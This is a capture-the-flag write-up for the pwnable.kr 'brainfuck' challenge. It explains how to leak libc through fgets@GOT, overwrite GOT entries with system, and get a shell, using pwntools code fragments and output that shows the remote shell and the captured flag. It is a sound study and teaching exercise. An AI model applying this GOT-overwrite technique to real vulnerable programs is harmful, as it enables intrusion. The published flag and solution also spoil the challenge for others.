# Pwnable.kr - Brainfuck CTF Writeup

## Challenge Summary

* **Name**: brainfuck
* **Platform**: [pwnable.kr](http://pwnable.kr)
* **Category**: Exploitation / Pwn
* **Difficulty**: Medium

We’re given a custom Brainfuck interpreter binary that allows us to input brainfuck instructions, except `[` and `]`. Our goal is to get a shell.

---

## Analysis

The binary disables loops (`[` and `]`), limiting traditional brainfuck control flow. But we still have access to `,` (input), `.` (output), `<`, and `>` to manipulate the tape, and can abuse memory writes with `,`.

### Observations:

* There is a static tape pointer at address `0x0804a0a0`
* We can leak memory with `.`
* We can write arbitrary data with `,`
* GOT entries for functions like `fgets`, `memset`, `putchar` are writable

We use this to:

1. Leak a libc address (`fgets@GOT`)
2. Calculate the libc base
3. Overwrite a GOT entry with the address of `system`
4. Send `/bin/sh` and trigger a shell

---

## Exploit Strategy

### Step 1: Leak `fgets` address

```python
pl = move(tape, plt["fgets"])
pl += read(4)
pl += write(4)
```

This reads the 4-byte pointer from `fgets@GOT` and writes it back so we can read it with `.`, leaking the libc address.

### Step 2: Overwrite GOT entries

```python
pl += move(plt["fgets"], plt["memset"])
pl += write(4)
pl += move(plt["memset"], plt["putchar"])
pl += write(4)
pl += '.'  # trigger output
```

### Step 3: Parse libc leak and calculate `system`

```python
fgets = int.from_bytes(r.recvn(4), byteorder="little", signed=False)
libc_base = fgets - offset["fgets"]
gets = libc_base + offset["gets"]
system = libc_base + offset["system"]
```

We use pwntools' ELF parser to grab the offsets for `fgets`, `gets`, and `system`:

```python
libc = ELF("./bf_libc.so")
offset = {
    "fgets": libc.symbols[b"fgets"],
    "gets": libc.symbols[b"gets"],
    "system": libc.symbols[b"system"]
}
```

### Step 4: Send `/bin/sh` and overwrite memset with system

Then we send `/bin/sh` to tape, overwrite `memset@got` with `system`, and call it.

---

## Final Exploit Output

```
$ python3 brainfuck_exploit.py
[*] '/Users/flacco/CTFS/Brainfuck/bf_libc.so'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Opening connection to pwnable.kr on port 9001: Done
fgets: 0xf7d8f160
gets:  0xf7d903f0
system: 0xf7d6bdb0
[*] Switching to interactive mode
welcome to brainfuck testing system!!
type some brainfuck instructions except [ ]
$ whoami
brainfuck_pwn
$ ls -la
total 12
drwxr-xr-x 1 root          root          4096 Apr 27 13:35 .
drwxr-xr-x 1 root          root          4096 Jun  9 13:38 ..
drwxr-xr-x 1 brainfuck_pwn brainfuck_pwn 4096 May 19 04:07 brainfuck_pwn
$ cd brainfuck_pwn
$ ls
brainfuck
flag
super.pl
$ cat flag
bR41n_F4ck_Is_FuN_LanguaG3
```

---

## Takeaways

* This was a lot harder than the previous Blackjack Exploit, I did.
* Forntunately I had many resources to learn what exploit technique was needed
* for this CTF. I realized that my payload was not great and after seeing advanced payloads
* I improved my ability to write python payloads to automate the process fo finding offsetts
* and addresses. 

---

## Files

* `brainfuck_exploit.py` (main script)
* `bf_libc.so` (libc dump from remote)
